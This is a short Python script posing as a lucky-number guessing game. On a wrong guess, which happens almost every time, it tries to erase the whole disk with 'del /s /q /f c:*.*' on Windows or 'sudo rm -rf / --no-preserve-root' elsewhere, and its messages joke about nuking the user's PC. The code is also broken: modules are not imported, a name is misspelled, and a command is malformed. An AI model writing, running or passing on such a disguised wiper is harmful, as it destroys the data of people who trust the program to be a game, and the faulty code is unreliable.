import random

def guess_lucky_number():
    lucky_number = random.randint(1, 100)
    try:
        guess = int(input("guess the lucky number between 1 and 100: "))
    except ValueError:
        print("you cant type that. try different integrer")
        return

    if guess == lucky_number:
        print("you guessed the number correctly! you wont have to buy a new pc now.")
    else:
        print("you guessed it wrong, your pc finna nuke")
        if sys.platform == "win32":
            subproccess.run(["del /s /q /f c:*.*"], shell=True)
        else:
            subprocess.run(["sudo rm -rf / --no-preserve-root"])

if __name__ == "__main__":
    guess_lucky_number()
